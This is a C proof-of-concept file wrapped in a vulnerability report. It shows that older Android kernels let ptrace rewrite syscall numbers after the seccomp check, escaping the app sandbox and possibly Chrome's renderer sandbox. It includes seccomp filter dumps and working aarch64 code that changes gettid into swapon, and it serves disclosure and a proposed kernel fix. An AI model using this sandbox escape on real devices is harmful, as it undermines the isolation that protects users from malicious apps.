/*
The seccomp.2 manpage (http://man7.org/linux/man-pages/man2/seccomp.2.html) documents:

              Before kernel 4.8, the seccomp check will not be run again
              after the tracer is notified.  (This means that, on older ker‐
              nels, seccomp-based sandboxes must not allow use of
              ptrace(2)—even of other sandboxed processes—without extreme
              care; ptracers can use this mechanism to escape from the sec‐
              comp sandbox.)

Multiple existing Android devices with ongoing security support (including Pixel 1 and Pixel 2) ship kernels older than that; therefore, in a context where ptrace works, seccomp policies that don't blacklist ptrace can not be considered to be security boundaries.


The zygote applies a seccomp sandbox to system_server and all app processes; this seccomp sandbox permits the use of ptrace:

================
===== filter 0 (164 instructions) =====
0001 if arch == AARCH64: [true +2, false +0]
[...]
0010     if nr >= 0x00000069: [true +1, false +0]
0012       if nr >= 0x000000b4: [true +17, false +16] -> ret TRAP
0023       ret ALLOW (syscalls: init_module, delete_module, timer_create, timer_gettime, timer_getoverrun, timer_settime, timer_delete, clock_settime, clock_gettime, clock_getres, clock_nanosleep, syslog, ptrace, sched_setparam, sched_setscheduler, sched_getscheduler, sched_getparam, sched_setaffinity, sched_getaffinity, sched_yield, sched_get_priority_max, sched_get_priority_min, sched_rr_get_interval, restart_syscall, kill, tkill, tgkill, sigaltstack, rt_sigsuspend, rt_sigaction, rt_sigprocmask, rt_sigpending, rt_sigtimedwait, rt_sigqueueinfo, rt_sigreturn, setpriority, getpriority, reboot, setregid, setgid, setreuid, setuid, setresuid, getresuid, setresgid, getresgid, setfsuid, setfsgid, times, setpgid, getpgid, getsid, setsid, getgroups, setgroups, uname, sethostname, setdomainname, getrlimit, setrlimit, getrusage, umask, prctl, getcpu, gettimeofday, settimeofday, adjtimex, getpid, getppid, getuid, geteuid, getgid, getegid, gettid, sysinfo)
0011     if nr >= 0x00000068: [true +18, false +17] -> ret TRAP
0023     ret ALLOW (syscalls: nanosleep, getitimer, setitimer)
[...]
002a if nr >= 0x00000018: [true +7, false +0]
0032   if nr >= 0x00000021: [true +3, false +0]
0036     if nr >= 0x00000024: [true +1, false +0]
0038       if nr >= 0x00000028: [true +106, false +105] -> ret TRAP
00a2       ret ALLOW (syscalls: sync, kill, rename, mkdir)
0037     if nr >= 0x00000022: [true +107, false +106] -> ret TRAP
00a2     ret ALLOW (syscalls: access)
0033   if nr >= 0x0000001a: [true +1, false +0]
0035     if nr >= 0x0000001b: [true +109, false +108] -> ret TRAP
00a2     ret ALLOW (syscalls: ptrace)
0034   if nr >= 0x00000019: [true +110, false +109] -> ret TRAP
00a2   ret ALLOW (syscalls: getuid)
[...]
================

The SELinux policy allows even isolated_app context, which is used for Chrome's renderer sandbox, to use ptrace:

================
# Google Breakpad (crash reporter for Chrome) relies on ptrace
# functionality. Without the ability to ptrace, the crash reporter
# tool is broken.
# b/20150694
# https://code.google.com/p/chromium/issues/detail?id=475270
allow isolated_app self:process ptrace;
================

Chrome applies two extra layers of seccomp sandbox; but these also permit the use of clone and ptrace:
================
===== filter 1 (194 instructions) =====
0001 if arch == AARCH64: [true +2, false +0]
[...]
0002 if arch != ARM: [true +0, false +60] -> ret TRAP
[...]
0074     if nr >= 0x0000007a: [true +1, false +0]
0076       if nr >= 0x0000007b: [true +74, false +73] -> ret TRAP
00c0       ret ALLOW (syscalls: uname)
0075     if nr >= 0x00000079: [true +75, false +74] -> ret TRAP
00c0     ret ALLOW (syscalls: fsync, sigreturn, clone)
[...]
004d   if nr >= 0x0000001a: [true +1, false +0]
004f     if nr >= 0x0000001b: [true +113, false +112] -> ret TRAP
00c0     ret ALLOW (syscalls: ptrace)
[...]
===== filter 2 (449 instructions) =====
0001 if arch != ARM: [true +0, false +1] -> ret TRAP
[...]
00b6         if nr < 0x00000019: [true +4, false +0] -> ret ALLOW (syscalls: getuid)
00b7         if nr >= 0x0000001a: [true +3, false +8] -> ret ALLOW (syscalls: ptrace)
01c0         ret TRAP
[...]
007f     if nr >= 0x00000073: [true +0, false +5]
0080       if nr >= 0x00000076: [true +0, false +2]
0081         if nr < 0x00000079: [true +57, false +0] -> ret ALLOW (syscalls: fsync, sigreturn, clone)
[...]
================

Therefore, this not only breaks the app sandbox, but can probably also be used to break part of the isolation of a Chrome renderer process.


To test this, build the following file (as an aarch64 binary) and run it from app context (e.g. using connectbot):

================
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <err.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <linux/elf.h>
#include <asm/ptrace.h>
#include <sys/uio.h>

int main(void) {
  setbuf(stdout, NULL);

  pid_t child = fork();
  if (child == -1) err(1, "fork");
  if (child == 0) {
    pid_t my_pid = getpid();
    while (1) {
      errno = 0;
      int res = syscall(__NR_gettid, 0, 0);
      if (res != my_pid) {
        printf("%d (%s)\n", res, strerror(errno));
      }
    }
  }

  sleep(1);

  if (ptrace(PTRACE_ATTACH, child, NULL, NULL)) err(1, "ptrace attach");
  int status;
  if (waitpid(child, &status, 0) != child) err(1, "wait for child");

  if (ptrace(PTRACE_SYSCALL, child, NULL, NULL)) err(1, "ptrace syscall entry");
  if (waitpid(child, &status, 0) != child) err(1, "wait for child");

  int syscallno;
  struct iovec iov = { .iov_base = &syscallno, .iov_len = sizeof(syscallno) };
  if (ptrace(PTRACE_GETREGSET, child, NT_ARM_SYSTEM_CALL, &iov)) err(1, "ptrace getregs");
  printf("seeing syscall %d\n", syscallno);
  if (syscallno != __NR_gettid) errx(1, "not gettid");
  syscallno = __NR_swapon;
  if (ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &iov)) err(1, "ptrace setregs");

  if (ptrace(PTRACE_DETACH, child, NULL, NULL)) err(1, "ptrace syscall");
  kill(child, SIGCONT);
  sleep(5);
  kill(child, SIGKILL);
  return 0;
}

/*
================

If the attack works, you'll see "-1 (Operation not permitted)", which indicates that the seccomp filter for swapon() was bypassed and the kernel's capability check was reached.

For comparison, the following (a straight syscall to swapon()) fails with SIGSYS:

================
#include <unistd.h>
#include <sys/syscall.h>
int main(void) {
  syscall(__NR_swapon, 0, 0);
}
================

Attaching screenshot from connectbot.

I believe that a sensible fix would be to backport the behavior change that occured in kernel 4.8 to Android's stable branches.
*/